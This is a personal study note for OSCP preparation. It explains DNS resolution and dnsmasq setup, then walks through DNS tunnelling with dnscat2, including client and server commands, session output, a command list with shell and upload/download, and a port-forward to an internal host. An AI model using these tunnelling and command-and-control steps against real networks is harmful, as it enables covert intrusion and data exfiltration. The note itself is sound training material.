---
aliases:
  - DNS tunneling
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - dns_tunneling
  - dns
  - tunneling
author: Mehdi N Tehrani
creat_date: 2024-01-04
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# DNS Theory

![[Pasted image 20240104173546.png]]

## DNS query process
Client tries to reach `www.example.com`
- In most cases, we'll ask a DNS *recursive resolver server* for the DNS address record (*A record*) of the domain. The recursive resolver will make all the following DNS queries until it satisfies the DNS request, then returns the response to us.
- The recursive resolver holds a list of [root name servers](https://en.wikipedia.org/wiki/Root_name_server#Root_server_addresses) (as of 2022, there are 13 of them scattered around the world). Its first task is to send a DNS query to one of these root name servers. Because example.com has the `.com` suffix, the root name server will respond with the address of a DNS name server that's responsible for the `.com` top-level domain (TLD) - *TLD name server*.
- The recursive resolver then queries the `.com` TLD name server, asking which DNS server is responsible for `example.com`. The TLD name server will respond with the **authoritative name server** for the `example.com` domain.
- The recursive resolver then asks the `example.com` *authoritative name server* for the IPv4 address of `www.eexample.com`. The `example.com` authoritative name server replies with the **A record** for that.
The recursive resolver then returns that to us. All these requests and responses are transported over UDP, with UDP/53 being the standard DNS port.


# Set up simple DNS server
#simple #dns_server #light_weight #lightweight
## dnsmasq
#dnsmasq
```
# normal mode
sudo dnsmasq -C dnsmasq.conf
              ^ config

# non-daemon mode
sudo dnsmasq -C dnsmasq.conf -d
                              ^ not in daemon mode: to view the logs
```

## Check DNS status
To find out what DNS resolver the host is using in debian-based distros
#dns_status #debian #linux
```
resolvectl status
```

## Monitor DNS
#monitor #dns_traffic
```
sudo tcpdump -i <interface> udp port 53
```

# DNS Tunneling
#tunnel #tunneling 

## dnscat2
#dnscat #dnscat2
[dnscat2 GitHub](https://github.com/iagox86/dnscat2)
[dnscat2 GitHub - Usage](https://github.com/iagox86/dnscat2#usage)

`dnscat2` uses _CNAME_, _TXT_, and _MX_ queries and responses. As indicated by this network data, DNS tunneling is certainly not stealthy! This output reveals a huge data transfer from the dnscat2 client to the server. All the request and response payloads are **encrypted**.


### client
```sh
$ ./dnscat <domain>
```
Output:
```
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Abate Frozen Tonite Frozen Parrot Unborn 

Session established!
```

### server
#server
```sh
dnscat2-server <domain>
```
output:
```
New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=6a6485b554ceb272c6f005a2b7d4d291 feline.corp

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=6a6485b554ceb272c6f005a2b7d4d291

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```
Once new window created:
```
dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Abate Frozen Tonite Frozen Parrot Unborn
```
#### dnscat config file
```
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```

#### Monitoring using dnscat2 shell
- list windows using `windows`
#dnscat_window #dnscat_windows
```dnscat
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (client_hostname) [encrypted, NOT verified] [*]
```

- interact with a window `window -i`
```dnscat
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Abate Frozen Tonite Frozen Parrot Unborn
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

```

- list available commands using `?`
```
command (client_hostname) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
```

#### tunneling
#tunneling  
Syntax
`listen 127.0.0.1:<lport> <rhost>:<rport>`

```dnscat
command (client_hostname)> listen 127.0.0.1:4646 172.16.240.217:4646
Listening on 127.0.0.1:4646, sending connections to 172.16.240.217:4646
```

#### commands help
```
command (pgdatabase01) 1> listen --help                                                                                                                      
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message
```
